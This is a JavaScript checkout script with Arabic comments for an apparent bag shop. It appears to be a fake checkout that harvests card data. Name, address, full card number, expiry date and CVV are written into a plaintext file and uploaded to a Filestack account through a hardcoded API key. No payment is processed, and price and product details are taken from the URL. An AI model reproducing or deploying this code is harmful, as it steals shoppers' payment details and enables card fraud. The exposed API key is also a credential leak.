document.addEventListener('DOMContentLoaded', function () {
  const form = document.getElementById('checkout-form');

  // استخراج المعلمات من الرابط
  function getUrlParams() {
    const params = {};
    const queryString = window.location.search;
    const urlParams = new URLSearchParams(queryString);
    urlParams.forEach((value, key) => {
      params[key] = decodeURIComponent(value);  // فك تشفير القيم
    });
    return params;
  }

  const urlParams = getUrlParams();

  // ملء معلومات المنتج باستخدام المعلمات المستلمة من الرابط
  document.getElementById('product-name').textContent = urlParams.name || "Product Name";
  document.getElementById('product-color').textContent = urlParams.color || "Product Color";
  document.getElementById('product-price').textContent = `$${urlParams.price || "0.00"}`;
  document.getElementById('total-price').textContent = `$${urlParams.price || "0.00"}`;

  // عرض الصورة
  const productImage = document.getElementById('product-image');
  const productImageContainer = document.querySelector('.product-info');

  if (urlParams.image) {
    // التأكد من أن الصورة ليست فارغة
    productImage.src = urlParams.image;  // تعيين رابط الصورة
    productImage.alt = urlParams.name || 'Product' + ' image';  // إضافة نص بديل للصورة
    productImage.style.display = 'block';  // إظهار الصورة
  } else {
    // إذا كانت الصورة غير موجودة أو فارغة، عرض صورة افتراضية
    productImage.src = 'https://via.placeholder.com/500x300?text=No+Image+Available';  // صورة افتراضية
    productImage.alt = 'No Image Available';
    productImage.style.display = 'block';  // إظهار الصورة
  }

  // عرض الكمية
  const productQuantity = parseInt(urlParams.quantity, 10) || 1; // تعيين الكمية الافتراضية إلى 1 إذا لم يتم إرسالها
  document.getElementById('product-quantity').textContent = productQuantity;

  // حساب السعر الإجمالي
  const productPrice = parseFloat(urlParams.price) || 0; // تحويل السعر إلى عدد عشري
  const totalPrice = (productPrice * productQuantity).toFixed(2); // حساب السعر الإجمالي
  document.getElementById('total-price').textContent = '$' + totalPrice;

  // إضافة مستمع للإرسال
  form.addEventListener('submit', function (event) {
    event.preventDefault();  // منع إعادة تحميل الصفحة عند الإرسال

    // جمع البيانات من الحقول
    const email = document.getElementById('email').value;
    const firstName = document.getElementById('first-name').value;
    const lastName = document.getElementById('last-name').value;
    const streetHouseApartmentUnit = document.getElementById('street-house-apartment-unit').value;
    const city = document.getElementById('city').value;
    const state = document.getElementById('state').value;
    const zipCode = document.getElementById('zip-code').value;
    const cardName = document.getElementById('card-name').value;
    const cardNumber = document.getElementById('card-number').value;
    const expiry = document.getElementById('expiry').value;
    const cvv = document.getElementById('cvv').value;

    // معلومات المنتج
    const productName = document.getElementById('product-name').textContent.split(': ')[1];  // اسم المنتج
    const productPriceText = document.getElementById('product-price').textContent.split(': ')[1];  // سعر المنتج
    const productQuantityText = document.getElementById('product-quantity').textContent.split(': ')[1];  // كمية المنتج
    const productImageUrl = urlParams.productImage || '';  // رابط الصورة

    // تحقق من القيم
    let isValid = true;

    removeErrorMessages();  // إزالة رسائل الخطأ السابقة

    // تحقق من الحقول الفارغة
    if (!email || !firstName || !lastName || !streetHouseApartmentUnit || !city || !state || !zipCode || !cardName || !cardNumber || !expiry || !cvv) {
        isValid = false;
        showErrorMessage('Please fill out all required fields.', 'general');
    }

    // تحقق من صحة البريد الإلكتروني
    if (!validateEmail(email)) {
        isValid = false;
        showErrorMessage('Please enter a valid email address.', 'email');
    }

    // تحقق من اسم حامل البطاقة
    if (!validateCardName(cardName)) {
        isValid = false;
        showErrorMessage('Please enter a valid cardholder name (letters only).', 'card-name');
    }

    // تحقق من صحة أرقام البطاقة (Visa / MasterCard فقط)
    if (!validateCard(cardNumber)) {
        isValid = false;
        showErrorMessage('Please enter a valid Visa or MasterCard number.', 'card-number');
    }

    // تحقق من تاريخ الصلاحية
    if (!validateExpiry(expiry)) {
        isValid = false;
        showErrorMessage('Please enter a valid expiry date in MM/YY format.', 'expiry');
    }

    // تحقق من CVV
    if (!validateCVV(cvv)) {
        isValid = false;
        showErrorMessage('Please enter a valid CVV number.', 'cvv');
    }

    if (isValid) {
        // إنشاء محتوى الملف النصي مع بيانات المنتج
        const orderData =  
            `Email: ${email}\n
            First Name: ${firstName}\n
            Last Name: ${lastName}\n
            Street_House_Apartment_Unit: ${streetHouseApartmentUnit}\n
            City: ${city}\n
            State: ${state}\n
            Zip Code: ${zipCode}\n
            Cardholders Name: ${cardName}\n
            Card Number: ${cardNumber}\n
            Expiry Date: ${expiry}\n
            CVV: ${cvv}\n
            --- Product Details ---\n
            Product Name: ${productName}\n
            Product Price: $${productPriceText}\n
            Product Quantity: ${productQuantityText}\n
            Product Image URL: ${productImageUrl}\n
            Total Price: $${totalPrice}`;

        // تحويل البيانات إلى Blob (بيانات ثنائية)
        const blob = new Blob([orderData], { type: 'text/plain' });

        // إعدادات Filestack API
        const apiKey = 'A7fSrsBg3RjybN1kkK99lz'; // استبدل بـ API Key الخاص بك
        const client = filestack.init(apiKey);

        // رفع الملف إلى Filestack
        client.upload(blob)
            .then(result => {
                // عند نجاح رفع الملف
                alert('Your order has been successfully placed and saved to Filestack!');
                window.location.href = 'https://checkout.glamhavenbags.shop/thank-you.html';  // إعادة توجيه إلى صفحة الشكر
                console.log(result);  // تفاصيل رفع الملف
            })
            .catch(error => {
                // في حال حدوث خطأ
                console.error('Error uploading file to Filestack:', error);
                alert('Something went wrong, please try again later.');
            });
    }
  });
});

// دالة للتحقق من البريد الإلكتروني
function validateEmail(email) {
  const emailPattern = /^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$/;
  return emailPattern.test(email);
}

// دالة للتحقق من اسم حامل البطاقة (يجب أن يحتوي فقط على حروف)
function validateCardName(cardName) {
  const namePattern = /^[a-zA-Z\s]+$/;  // اسم يحتوي فقط على حروف ومسافات
  return namePattern.test(cardName);
}

// دالة للتحقق من رقم البطاقة (Visa / MasterCard فقط)
function validateCard(cardNumber) {
  const visaMasterCardPattern = /^(4[0-9]{12}|5[1-5][0-9]{14})$/;  // Visa أو MasterCard فقط
  return visaMasterCardPattern.test(cardNumber);
}

// دالة للتحقق من تاريخ انتهاء البطاقة (صالح فقط في MM/YY)
function validateExpiry(expiry) {
  const expiryPattern = /^(0[1-9]|1[0-2])\/\d{2}$/;  // MM/YY
  return expiryPattern.test(expiry);
}

// دالة للتحقق من CVV
function validateCVV(cvv) {
  const cvvPattern = /^[0-9]{3}$/;  // CVV يتكون من 3 أرقام
  return cvvPattern.test(cvv);
}

// دالة لعرض رسائل الخطأ
function showErrorMessage(message, fieldId) {
  const field = document.getElementById(fieldId);
  const errorMessage = document.createElement('p');
  errorMessage.classList.add('error-message');
  errorMessage.textContent = message;
  field.parentNode.appendChild(errorMessage);
}

// دالة لإزالة رسائل الخطأ
function removeErrorMessages() {
  const errorMessages = document.querySelectorAll('.error-message');
  errorMessages.forEach(message => message.remove());
}

